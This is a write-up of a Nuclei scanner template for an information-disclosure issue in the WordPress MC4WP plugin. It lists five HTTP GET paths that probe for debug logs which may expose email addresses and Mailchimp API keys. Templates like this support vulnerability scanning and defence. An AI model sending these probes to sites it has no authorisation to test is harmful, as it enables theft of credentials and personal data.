# Nuclei Template: WordPress MC4WP - Debug Log Exposure
**Template ID:** wp-mailchimp-log-exposure
**Vulnerability Class:** Information Disclosure
**Severity:** Medium
**CWE:** CWE-200
**Source:** Nuclei Template (`wp-mailchimp-log-exposure.yaml`)

## Vulnerability Information & PoC

## Description
Detected WordPress Mailchimp for WordPress (MC4WP) debug log. The log file may contain email addresses, Mailchimp API keys, and error details.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/uploads/mc4wp-debug.log
GET {{BaseURL}}/wp-content/uploads/mc4wp-debug-log.php
GET {{BaseURL}}/wp-content/uploads/mailchimp-for-wp/debug-log.php
GET {{BaseURL}}/wp-content/uploads/sites/1/mc4wp-debug-log.php
GET {{BaseURL}}/wp-content/uploads/sites/1/mailchimp-for-wp/debug-log.php
```

## References
- https://wordpress.org/plugins/mailchimp-for-wp/
